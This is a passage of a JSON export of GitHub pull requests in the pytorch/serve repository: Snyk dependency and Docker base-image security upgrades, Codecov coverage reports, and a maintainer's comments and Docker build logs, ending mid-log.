                "body": "<h3>Snyk has created this PR to upgrade com.google.code.gson:gson from 2.9.0 to 2.10.</h3>\n\n:information_source: Keep your dependencies up-to-date. This makes it easier to fix existing vulnerabilities and to more quickly identify and fix newly disclosed vulnerabilities when they affect your project.\n<hr/>\n\n- The recommended version is **2 versions** ahead of your current version.\n- The recommended version was released **3 months ago**, on 2022-10-25.\n\n\n<hr/>\n\n**Note:** *You are seeing this because you or someone else with access to this repository has authorized Snyk to open upgrade PRs.*\n\nFor more information:  <img src=\"https://api.segment.io/v1/pixel/track?data=eyJ3cml0ZUtleSI6InJyWmxZcEdHY2RyTHZsb0lYd0dUcVg4WkFRTnNCOUEwIiwiYW5vbnltb3VzSWQiOiIwZjU5MzkxMi0xOGJkLTQzMTctYjMwYy1jZTg2NzE5YjU5ZjkiLCJldmVudCI6IlBSIHZpZXdlZCIsInByb3BlcnRpZXMiOnsicHJJZCI6IjBmNTkzOTEyLTE4YmQtNDMxNy1iMzBjLWNlODY3MTliNTlmOSJ9fQ==\" width=\"0\" height=\"0\"/>\n\n🧐 [View latest project report](https://app.snyk.io/org/msaroufim/project/cb5f8918-eb96-4f82-a31c-305d5b98b401?utm_source&#x3D;github&amp;utm_medium&#x3D;referral&amp;page&#x3D;upgrade-pr)\n\n🛠 [Adjust upgrade PR settings](https://app.snyk.io/org/msaroufim/project/cb5f8918-eb96-4f82-a31c-305d5b98b401/settings/integration?utm_source&#x3D;github&amp;utm_medium&#x3D;referral&amp;page&#x3D;upgrade-pr)\n\n🔕 [Ignore this dependency or unsubscribe from future upgrade PRs](https://app.snyk.io/org/msaroufim/project/cb5f8918-eb96-4f82-a31c-305d5b98b401/settings/integration?pkg&#x3D;com.google.code.gson:gson&amp;utm_source&#x3D;github&amp;utm_medium&#x3D;referral&amp;page&#x3D;upgrade-pr#auto-dep-upgrades)\n\n<!--- (snyk:metadata:{\"prId\":\"0f593912-18bd-4317-b30c-ce86719b59f9\",\"prPublicId\":\"0f593912-18bd-4317-b30c-ce86719b59f9\",\"dependencies\":[{\"name\":\"com.google.code.gson:gson\",\"from\":\"2.9.0\",\"to\":\"2.10\"}],\"packageManager\":\"maven\",\"type\":\"auto\",\"projectUrl\":\"https://app.snyk.io/org/msaroufim/project/cb5f8918-eb96-4f82-a31c-305d5b98b401?utm_source=github&utm_medium=referral&page=upgrade-pr\",\"projectPublicId\":\"cb5f8918-eb96-4f82-a31c-305d5b98b401\",\"env\":\"prod\",\"prType\":\"upgrade\",\"vulns\":[],\"issuesToFix\":[],\"upgrade\":[],\"upgradeInfo\":{\"versionsDiff\":2,\"publishedDate\":\"2022-10-25T01:09:39.000Z\"},\"templateVariants\":[],\"hasFixes\":false,\"isMajorUpgrade\":false,\"isBreakingChange\":false,\"priorityScoreList\":[]}) --->\n",
                "comments": [
                    {
                        "body": "# [Codecov](https://codecov.io/gh/pytorch/serve/pull/2069?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2069](https://codecov.io/gh/pytorch/serve/pull/2069?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (41de0a2) into [master](https://codecov.io/gh/pytorch/serve/commit/b0b3af1e9529e56e60d1999757973ae0bf244da8?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (b0b3af1) will **not change** coverage.\n> The diff coverage is `n/a`.\n\n```diff\n@@           Coverage Diff           @@\n##           master    #2069   +/-   ##\n=======================================\n  Coverage   53.38%   53.38%           \n=======================================\n  Files          71       71           \n  Lines        3224     3224           \n  Branches       56       56           \n=======================================\n  Hits         1721     1721           \n  Misses       1503     1503           \n```\n\n\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-01-12T00:08:52Z",
                        "url": "https://github.com/pytorch/serve/pull/2069#issuecomment-1379641237"
                    },
                    {
                        "body": "For reference this is the bot I enabled, it seems to be doing its job which is awesome - it's more security focused than dependabot",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-01-12T04:22:16Z",
                        "url": "https://github.com/pytorch/serve/pull/2069#issuecomment-1379796186"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2069",
                    "merged_at": "2023-01-13T00:31:10Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2066",
                "title": "[Snyk] Security upgrade ubuntu from 20.04 to rolling",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2066,
                "id": 1526484420,
                "state": "closed",
                "project_created_at": "2023-01-09T23:14:22Z",
                "closed_at": "2023-01-17T23:04:25Z",
                "body": "<p>This PR was automatically created by Snyk using the credentials of a real user.</p><br />Keeping your Docker base image up-to-date means you’ll benefit from security fixes in the latest version of your chosen image.\n\n#### Changes included in this PR \n\n\n- docker/Dockerfile.neuron.dev\n\nWe recommend upgrading to `ubuntu:rolling`, as this image has only 6 known vulnerabilities. To do this, merge this pull request, then verify your application still works as expected.\n\n\n\nSome of the most important vulnerabilities in your base image include:\n\n| Severity                                                                                                                 | Priority Score / 1000  | Issue                                                                     | Exploit Maturity      |\n| :------:                                                                                                                 | :--------------------  | :----                                                                     | :---------------      |\n| ![low severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/l.png \"low severity\")   | **150**  | Uncontrolled Recursion <br/>[SNYK-UBUNTU2004-PCRE3-580031](https://snyk.io/vuln/SNYK-UBUNTU2004-PCRE3-580031)   | No Known Exploit   |\n| ![low severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/l.png \"low severity\")   | **150**  | Time-of-check Time-of-use (TOCTOU) <br/>[SNYK-UBUNTU2004-SHADOW-577863](https://snyk.io/vuln/SNYK-UBUNTU2004-SHADOW-577863)   | No Known Exploit   |\n| ![low severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/l.png \"low severity\")   | **150**  | Time-of-check Time-of-use (TOCTOU) <br/>[SNYK-UBUNTU2004-SHADOW-577863](https://snyk.io/vuln/SNYK-UBUNTU2004-SHADOW-577863)   | No Known Exploit   |\n| ![medium severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/m.png \"medium severity\")   | **300**  | Off-by-one Error <br/>[SNYK-UBUNTU2004-SYSTEMD-3098845](https://snyk.io/vuln/SNYK-UBUNTU2004-SYSTEMD-3098845)   | No Known Exploit   |\n| ![medium severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/m.png \"medium severity\")   | **300**  | Off-by-one Error <br/>[SNYK-UBUNTU2004-SYSTEMD-3098845](https://snyk.io/vuln/SNYK-UBUNTU2004-SYSTEMD-3098845)   | No Known Exploit   |\n\n\n\n---\n\n**Note:** _You are seeing this because you or someone else with access to this repository has authorized Snyk to open fix PRs._\n\nFor more information: <img src=\"https://api.segment.io/v1/pixel/track?data=eyJ3cml0ZUtleSI6InJyWmxZcEdHY2RyTHZsb0lYd0dUcVg4WkFRTnNCOUEwIiwiYW5vbnltb3VzSWQiOiJhZGMyOWVlYS1lMmFiLTQyYmEtOTBiNS03ZWNiYmZkZGNhNmIiLCJldmVudCI6IlBSIHZpZXdlZCIsInByb3BlcnRpZXMiOnsicHJJZCI6ImFkYzI5ZWVhLWUyYWItNDJiYS05MGI1LTdlY2JiZmRkY2E2YiJ9fQ==\" width=\"0\" height=\"0\"/>\n🧐 [View latest project report](https://app.snyk.io/org/msaroufim/project/fb6f747a-dcad-4e41-be96-53bfef5d80d1?utm_source&#x3D;github&amp;utm_medium&#x3D;referral&amp;page&#x3D;fix-pr)\n\n🛠 [Adjust project settings](https://app.snyk.io/org/msaroufim/project/fb6f747a-dcad-4e41-be96-53bfef5d80d1?utm_source&#x3D;github&amp;utm_medium&#x3D;referral&amp;page&#x3D;fix-pr/settings)\n\n[//]: # 'snyk:metadata:{\"prId\":\"adc29eea-e2ab-42ba-90b5-7ecbbfddca6b\",\"prPublicId\":\"adc29eea-e2ab-42ba-90b5-7ecbbfddca6b\",\"dependencies\":[{\"name\":\"ubuntu\",\"from\":\"20.04\",\"to\":\"rolling\"}],\"packageManager\":\"dockerfile\",\"projectPublicId\":\"fb6f747a-dcad-4e41-be96-53bfef5d80d1\",\"projectUrl\":\"https://app.snyk.io/org/msaroufim/project/fb6f747a-dcad-4e41-be96-53bfef5d80d1?utm_source=github&utm_medium=referral&page=fix-pr\",\"type\":\"user-initiated\",\"patch\":[],\"vulns\":[\"SNYK-UBUNTU2004-SYSTEMD-3098845\",\"SNYK-UBUNTU2004-SHADOW-577863\",\"SNYK-UBUNTU2004-PCRE3-580031\"],\"upgrade\":[\"SNYK-UBUNTU2004-PCRE3-580031\",\"SNYK-UBUNTU2004-SHADOW-577863\",\"SNYK-UBUNTU2004-SHADOW-577863\",\"SNYK-UBUNTU2004-SYSTEMD-3098845\",\"SNYK-UBUNTU2004-SYSTEMD-3098845\"],\"isBreakingChange\":false,\"env\":\"prod\",\"prType\":\"fix\",\"templateVariants\":[\"updated-fix-title\",\"priorityScore\"],\"priorityScoreList\":[300,150,150]}'\n\n---\n\n**Learn how to fix vulnerabilities with free interactive lessons:**\n\n 🦉 [Learn about vulnerability in an interactive lesson of Snyk Learn.](https://learn.snyk.io/?loc&#x3D;fix-pr)\n",
                "comments": [
                    {
                        "body": "# [Codecov](https://codecov.io/gh/pytorch/serve/pull/2066?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2066](https://codecov.io/gh/pytorch/serve/pull/2066?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (bd8c7b9) into [master](https://codecov.io/gh/pytorch/serve/commit/98fc25a68c94db7d9c6276415504becd0fea78af?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (98fc25a) will **not change** coverage.\n> The diff coverage is `n/a`.\n\n```diff\n@@           Coverage Diff           @@\n##           master    #2066   +/-   ##\n=======================================\n  Coverage   53.38%   53.38%           \n=======================================\n  Files          71       71           \n  Lines        3224     3224           \n  Branches       56       56           \n=======================================\n  Hits         1721     1721           \n  Misses       1503     1503           \n```\n\n\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-01-09T23:40:27Z",
                        "url": "https://github.com/pytorch/serve/pull/2066#issuecomment-1376497495"
                    },
                    {
                        "body": "I think we should delete this whole dockerfile since it's deprecated, not much value in keeping it around, we can merge this PR primarily to make Snyk happy but it's not necessary",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-01-12T18:16:33Z",
                        "url": "https://github.com/pytorch/serve/pull/2066#issuecomment-1380809441"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2066",
                    "merged_at": "2023-01-17T23:04:25Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2065",
                "title": "[Snyk] Security upgrade ubuntu from 20.04 to rolling",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2065,
                "id": 1526484405,
                "state": "closed",
                "project_created_at": "2023-01-09T23:14:22Z",
                "closed_at": "2023-01-17T18:56:28Z",
                "body": "<p>This PR was automatically created by Snyk using the credentials of a real user.</p><br />Keeping your Docker base image up-to-date means you’ll benefit from security fixes in the latest version of your chosen image.\n\n#### Changes included in this PR \n\n\n- docker/Dockerfile.dev\n\nWe recommend upgrading to `ubuntu:rolling`, as this image has only 6 known vulnerabilities. To do this, merge this pull request, then verify your application still works as expected.\n\n\n\nSome of the most important vulnerabilities in your base image include:\n\n| Severity                                                                                                                 | Priority Score / 1000  | Issue                                                                     | Exploit Maturity      |\n| :------:                                                                                                                 | :--------------------  | :----                                                                     | :---------------      |\n| ![low severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/l.png \"low severity\")   | **150**  | Uncontrolled Recursion <br/>[SNYK-UBUNTU2004-PCRE3-580031](https://snyk.io/vuln/SNYK-UBUNTU2004-PCRE3-580031)   | No Known Exploit   |\n| ![low severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/l.png \"low severity\")   | **150**  | Time-of-check Time-of-use (TOCTOU) <br/>[SNYK-UBUNTU2004-SHADOW-577863](https://snyk.io/vuln/SNYK-UBUNTU2004-SHADOW-577863)   | No Known Exploit   |\n| ![low severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/l.png \"low severity\")   | **150**  | Time-of-check Time-of-use (TOCTOU) <br/>[SNYK-UBUNTU2004-SHADOW-577863](https://snyk.io/vuln/SNYK-UBUNTU2004-SHADOW-577863)   | No Known Exploit   |\n| ![medium severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/m.png \"medium severity\")   | **300**  | Off-by-one Error <br/>[SNYK-UBUNTU2004-SYSTEMD-3098845](https://snyk.io/vuln/SNYK-UBUNTU2004-SYSTEMD-3098845)   | No Known Exploit   |\n| ![medium severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/m.png \"medium severity\")   | **300**  | Off-by-one Error <br/>[SNYK-UBUNTU2004-SYSTEMD-3098845](https://snyk.io/vuln/SNYK-UBUNTU2004-SYSTEMD-3098845)   | No Known Exploit   |\n\n\n\n---\n\n**Note:** _You are seeing this because you or someone else with access to this repository has authorized Snyk to open fix PRs._\n\nFor more information: <img src=\"https://api.segment.io/v1/pixel/track?data=eyJ3cml0ZUtleSI6InJyWmxZcEdHY2RyTHZsb0lYd0dUcVg4WkFRTnNCOUEwIiwiYW5vbnltb3VzSWQiOiIyYzhjYTA2OS1hMThmLTRiMmMtYTlmZi03OGU3ZjRlNWZlNGEiLCJldmVudCI6IlBSIHZpZXdlZCIsInByb3BlcnRpZXMiOnsicHJJZCI6IjJjOGNhMDY5LWExOGYtNGIyYy1hOWZmLTc4ZTdmNGU1ZmU0YSJ9fQ==\" width=\"0\" height=\"0\"/>\n🧐 [View latest project report](https://app.snyk.io/org/msaroufim/project/5f45cafc-892c-45f4-ba24-2808d8033950?utm_source&#x3D;github&amp;utm_medium&#x3D;referral&amp;page&#x3D;fix-pr)\n\n🛠 [Adjust project settings](https://app.snyk.io/org/msaroufim/project/5f45cafc-892c-45f4-ba24-2808d8033950?utm_source&#x3D;github&amp;utm_medium&#x3D;referral&amp;page&#x3D;fix-pr/settings)\n\n[//]: # 'snyk:metadata:{\"prId\":\"2c8ca069-a18f-4b2c-a9ff-78e7f4e5fe4a\",\"prPublicId\":\"2c8ca069-a18f-4b2c-a9ff-78e7f4e5fe4a\",\"dependencies\":[{\"name\":\"ubuntu\",\"from\":\"20.04\",\"to\":\"rolling\"}],\"packageManager\":\"dockerfile\",\"projectPublicId\":\"5f45cafc-892c-45f4-ba24-2808d8033950\",\"projectUrl\":\"https://app.snyk.io/org/msaroufim/project/5f45cafc-892c-45f4-ba24-2808d8033950?utm_source=github&utm_medium=referral&page=fix-pr\",\"type\":\"user-initiated\",\"patch\":[],\"vulns\":[\"SNYK-UBUNTU2004-SYSTEMD-3098845\",\"SNYK-UBUNTU2004-SHADOW-577863\",\"SNYK-UBUNTU2004-PCRE3-580031\"],\"upgrade\":[\"SNYK-UBUNTU2004-PCRE3-580031\",\"SNYK-UBUNTU2004-SHADOW-577863\",\"SNYK-UBUNTU2004-SHADOW-577863\",\"SNYK-UBUNTU2004-SYSTEMD-3098845\",\"SNYK-UBUNTU2004-SYSTEMD-3098845\"],\"isBreakingChange\":false,\"env\":\"prod\",\"prType\":\"fix\",\"templateVariants\":[\"updated-fix-title\",\"priorityScore\"],\"priorityScoreList\":[300,150,150]}'\n\n---\n\n**Learn how to fix vulnerabilities with free interactive lessons:**\n\n 🦉 [Learn about vulnerability in an interactive lesson of Snyk Learn.](https://learn.snyk.io/?loc&#x3D;fix-pr)\n",
                "comments": [
                    {
                        "body": "# [Codecov](https://codecov.io/gh/pytorch/serve/pull/2065?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2065](https://codecov.io/gh/pytorch/serve/pull/2065?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (1aaa788) into [master](https://codecov.io/gh/pytorch/serve/commit/3ca7834b82dc6465dda9e18b604a2f27384433de?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (3ca7834) will **not change** coverage.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head 1aaa788 differs from pull request most recent head 99e48b4. Consider uploading reports for the commit 99e48b4 to get more accurate results\n\n```diff\n@@           Coverage Diff           @@\n##           master    #2065   +/-   ##\n=======================================\n  Coverage   53.38%   53.38%           \n=======================================\n  Files          71       71           \n  Lines        3224     3224           \n  Branches       56       56           \n=======================================\n  Hits         1721     1721           \n  Misses       1503     1503           \n```\n\n\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-01-09T23:43:16Z",
                        "url": "https://github.com/pytorch/serve/pull/2065#issuecomment-1376499695"
                    },
                    {
                        "body": "Logs\r\n\r\n```\r\n(base) ubuntu@ip-172-31-17-70:~/serve/docker$ ./build_image.sh -bt dev -b snyk-fix-e1077ba036875975fd0ab47e0f5bffb7 -g -cv cu117 -t marksaroufim/torchserve:gpu-latest\r\n[+] Building 385.9s (14/14) FINISHED                                                 \r\n => [internal] load build definition from Dockerfile.dev                        0.9s\r\n => => transferring dockerfile: 4.32kB                                          0.0s\r\n => [internal] load .dockerignore                                               1.1s\r\n => => transferring context: 2B                                                 0.0s\r\n => resolve image config for docker.io/docker/dockerfile:experimental           0.7s\r\n => [auth] docker/dockerfile:pull token for registry-1.docker.io                0.0s\r\n => CACHED docker-image://docker.io/docker/dockerfile:experimental@sha256:600e  0.0s\r\n => [internal] load metadata for docker.io/nvidia/cuda:11.7.0-cudnn8-runtime-u  0.5s\r\n => [auth] nvidia/cuda:pull token for registry-1.docker.io                      0.0s\r\n => CACHED [compile-image 1/3] FROM docker.io/nvidia/cuda:11.7.0-cudnn8-runtim  0.0s\r\n => [compile-image 2/3] RUN --mount=type=cache,id=apt-dev,target=/var/cache/a  98.2s\r\n => [compile-image 3/3] RUN update-alternatives --install /usr/bin/python pyth  0.4s\r\n => [dev-image 1/2] RUN if [ \"gpu\" = \"gpu\" ]; then export USE_CUDA=1; fi      226.0s \r\n => [dev-image 2/2] WORKDIR /home/model-server                                  0.0s \r\n => [final-image 1/1] RUN echo \"dev image creation completed\"                   0.4s \r\n => exporting to image                                                         38.2s \r\n => => exporting layers                                                        38.2s \r\n => => writing image sha256:b1586f945f96fcf36c0c496cc37017b89afc3a762cb23b04e5  0.0s \r\n => => naming to docker.io/marksaroufim/torchserve:gpu-latest    \r\n```",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-01-12T18:19:44Z",
                        "url": "https://github.com/pytorch/serve/pull/2065#issuecomment-1380815329"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2065",
                    "merged_at": "2023-01-17T18:56:28Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2064",
                "title": "[Snyk] Security upgrade ubuntu from 20.04 to rolling",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2064,
                "id": 1526483372,
                "state": "closed",
                "project_created_at": "2023-01-09T23:13:31Z",
                "closed_at": "2023-01-17T21:21:07Z",
                "body": "<p>This PR was automatically created by Snyk using the credentials of a real user.</p><br />Keeping your Docker base image up-to-date means you’ll benefit from security fixes in the latest version of your chosen image.\n\n#### Changes included in this PR \n\n\n- docker/Dockerfile\n\nWe recommend upgrading to `ubuntu:rolling`, as this image has only 6 known vulnerabilities. To do this, merge this pull request, then verify your application still works as expected.\n\n\n\nSome of the most important vulnerabilities in your base image include:\n\n| Severity                                                                                                                 | Priority Score / 1000  | Issue                                                                     | Exploit Maturity      |\n| :------:                                                                                                                 | :--------------------  | :----                                                                     | :---------------      |\n| ![low severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/l.png \"low severity\")   | **150**  | Uncontrolled Recursion <br/>[SNYK-UBUNTU2004-PCRE3-580031](https://snyk.io/vuln/SNYK-UBUNTU2004-PCRE3-580031)   | No Known Exploit   |\n| ![low severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/l.png \"low severity\")   | **150**  | Time-of-check Time-of-use (TOCTOU) <br/>[SNYK-UBUNTU2004-SHADOW-577863](https://snyk.io/vuln/SNYK-UBUNTU2004-SHADOW-577863)   | No Known Exploit   |\n| ![low severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/l.png \"low severity\")   | **150**  | Time-of-check Time-of-use (TOCTOU) <br/>[SNYK-UBUNTU2004-SHADOW-577863](https://snyk.io/vuln/SNYK-UBUNTU2004-SHADOW-577863)   | No Known Exploit   |\n| ![medium severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/m.png \"medium severity\")   | **300**  | Off-by-one Error <br/>[SNYK-UBUNTU2004-SYSTEMD-3098845](https://snyk.io/vuln/SNYK-UBUNTU2004-SYSTEMD-3098845)   | No Known Exploit   |\n| ![medium severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/m.png \"medium severity\")   | **300**  | Off-by-one Error <br/>[SNYK-UBUNTU2004-SYSTEMD-3098845](https://snyk.io/vuln/SNYK-UBUNTU2004-SYSTEMD-3098845)   | No Known Exploit   |\n\n\n\n---\n\n**Note:** _You are seeing this because you or someone else with access to this repository has authorized Snyk to open fix PRs._\n\nFor more information: <img src=\"https://api.segment.io/v1/pixel/track?data=eyJ3cml0ZUtleSI6InJyWmxZcEdHY2RyTHZsb0lYd0dUcVg4WkFRTnNCOUEwIiwiYW5vbnltb3VzSWQiOiJlMGY5MGVmNC1hMjU4LTQ5ODItOWJhMS1mODMyYTRiOGYzMjEiLCJldmVudCI6IlBSIHZpZXdlZCIsInByb3BlcnRpZXMiOnsicHJJZCI6ImUwZjkwZWY0LWEyNTgtNDk4Mi05YmExLWY4MzJhNGI4ZjMyMSJ9fQ==\" width=\"0\" height=\"0\"/>\n🧐 [View latest project report](https://app.snyk.io/org/msaroufim/project/ad8cdeca-1810-450c-b930-16863a307899?utm_source&#x3D;github&amp;utm_medium&#x3D;referral&amp;page&#x3D;fix-pr)\n\n🛠 [Adjust project settings](https://app.snyk.io/org/msaroufim/project/ad8cdeca-1810-450c-b930-16863a307899?utm_source&#x3D;github&amp;utm_medium&#x3D;referral&amp;page&#x3D;fix-pr/settings)\n\n[//]: # 'snyk:metadata:{\"prId\":\"e0f90ef4-a258-4982-9ba1-f832a4b8f321\",\"prPublicId\":\"e0f90ef4-a258-4982-9ba1-f832a4b8f321\",\"dependencies\":[{\"name\":\"ubuntu\",\"from\":\"20.04\",\"to\":\"rolling\"}],\"packageManager\":\"dockerfile\",\"projectPublicId\":\"ad8cdeca-1810-450c-b930-16863a307899\",\"projectUrl\":\"https://app.snyk.io/org/msaroufim/project/ad8cdeca-1810-450c-b930-16863a307899?utm_source=github&utm_medium=referral&page=fix-pr\",\"type\":\"user-initiated\",\"patch\":[],\"vulns\":[\"SNYK-UBUNTU2004-SYSTEMD-3098845\",\"SNYK-UBUNTU2004-SHADOW-577863\",\"SNYK-UBUNTU2004-PCRE3-580031\"],\"upgrade\":[\"SNYK-UBUNTU2004-PCRE3-580031\",\"SNYK-UBUNTU2004-SHADOW-577863\",\"SNYK-UBUNTU2004-SHADOW-577863\",\"SNYK-UBUNTU2004-SYSTEMD-3098845\",\"SNYK-UBUNTU2004-SYSTEMD-3098845\"],\"isBreakingChange\":false,\"env\":\"prod\",\"prType\":\"fix\",\"templateVariants\":[\"updated-fix-title\",\"priorityScore\"],\"priorityScoreList\":[300,150,150]}'\n\n---\n\n**Learn how to fix vulnerabilities with free interactive lessons:**\n\n 🦉 [Learn about vulnerability in an interactive lesson of Snyk Learn.](https://learn.snyk.io/?loc&#x3D;fix-pr)\n",
                "comments": [
                    {
                        "body": "# [Codecov](https://codecov.io/gh/pytorch/serve/pull/2064?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2064](https://codecov.io/gh/pytorch/serve/pull/2064?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (99ef4c1) into [master](https://codecov.io/gh/pytorch/serve/commit/5ac9c516b33e31b505ec691f57d25cf224a9340a?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (5ac9c51) will **not change** coverage.\n> The diff coverage is `n/a`.\n\n```diff\n@@           Coverage Diff           @@\n##           master    #2064   +/-   ##\n=======================================\n  Coverage   53.38%   53.38%           \n=======================================\n  Files          71       71           \n  Lines        3224     3224           \n  Branches       56       56           \n=======================================\n  Hits         1721     1721           \n  Misses       1503     1503           \n```\n\n\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-01-09T23:40:39Z",
                        "url": "https://github.com/pytorch/serve/pull/2064#issuecomment-1376497666"
                    },
                    {
                        "body": "Logs\r\n\r\n```\r\n(base) ubuntu@ip-172-31-17-70:~/serve/docker$ ./build_image.sh -b snyk-fix-e1077ba036875975fd0ab47e0f5bffb7 -g -cv cu117 -t marksaroufim/torchserve:gpu-prod    \r\n[+] Building 202.1s (25/25) FINISHED                                                                                                                                                          \r\n => [internal] load build definition from Dockerfile                                                                                                                                     0.0s\r\n => => transferring dockerfile: 4.65kB                                                                                                                                                   0.0s\r\n => [internal] load .dockerignore                                                                                                                                                        0.0s\r\n => => transferring context: 2B                                                                                                                                                          0.0s\r\n => resolve image config for docker.io/docker/dockerfile:experimental                                                                                                                    0.6s\r\n => [auth] docker/dockerfile:pull token for registry-1.docker.io                                                                                                                         0.0s\r\n => CACHED docker-image://docker.io/docker/dockerfile:experimental@sha256:600e5c62eedff338b3f7a0850beb7c05866e0ef27b2d2e8c02aa468e78496ff5                                               0.0s\r\n => [internal] load metadata for docker.io/nvidia/cuda:11.7.0-cudnn8-runtime-ubuntu20.04                                                                                                 0.4s\r\n => [auth] nvidia/cuda:pull token for registry-1.docker.io                                                                                                                               0.0s\r\n => [internal] load build context                                                                                                                                                        0.0s\r\n => => transferring context: 80B                                                                                                                                                         0.0s\r\n => [compile-image 1/8] FROM docker.io/nvidia/cuda:11.7.0-cudnn8-runtime-ubuntu20.04@sha256:1dbd8330054ddabfcb0b772e2a56108232ff124fc8b62374e615c26e13e25d88                             0.0s\r\n => CACHED [runtime-image 2/9] RUN --mount=type=cache,target=/var/cache/apt     apt-get update &&     DEBIAN_FRONTEND=noninteractive apt-get install --no-install-recommends -y     pyt  0.0s\r\n => CACHED [runtime-image 3/9] RUN useradd -m model-server     && mkdir -p /home/model-server/tmp                                                                                        0.0s\r\n => CACHED [compile-image 2/8] RUN --mount=type=cache,id=apt-dev,target=/var/cache/apt     apt-get update &&     apt remove python-pip  python3-pip &&     DEBIAN_FRONTEND=noninteracti  0.0s\r\n => CACHED [compile-image 3/8] RUN update-alternatives --install /usr/bin/python python /usr/bin/python3.8 1     && update-alternatives --install /usr/local/bin/pip pip /usr/local/bin  0.0s\r\n => CACHED [compile-image 4/8] RUN python3.8 -m venv /home/venv                                                                                                                          0.0s\r\n => CACHED [compile-image 5/8] RUN python -m pip install -U pip setuptools                                                                                                               0.0s\r\n => CACHED [compile-image 6/8] RUN export USE_CUDA=1                                                                                                                                     0.0s\r\n => [compile-image 7/8] RUN TORCH_VER=$(curl --silent --location https://pypi.org/pypi/torch/json | python -c \"import sys, json, pkg_resources; releases = json.load(sys.stdin)['rele  129.8s\r\n => [compile-image 8/8] RUN python -m pip install -U setuptools && python -m pip install --no-cache-dir captum torchtext torchserve torch-model-archiver                                 3.9s\r\n => [runtime-image 4/9] COPY --chown=model-server --from=compile-image /home/venv /home/venv                                                                                            32.1s \r\n => [runtime-image 5/9] COPY dockerd-entrypoint.sh /usr/local/bin/dockerd-entrypoint.sh                                                                                                  0.0s \r\n => [runtime-image 6/9] RUN chmod +x /usr/local/bin/dockerd-entrypoint.sh     && chown -R model-server /home/model-server                                                                0.3s \r\n => [runtime-image 7/9] COPY config.properties /home/model-server/config.properties                                                                                                      0.0s \r\n => [runtime-image 8/9] RUN mkdir /home/model-server/model-store && chown -R model-server 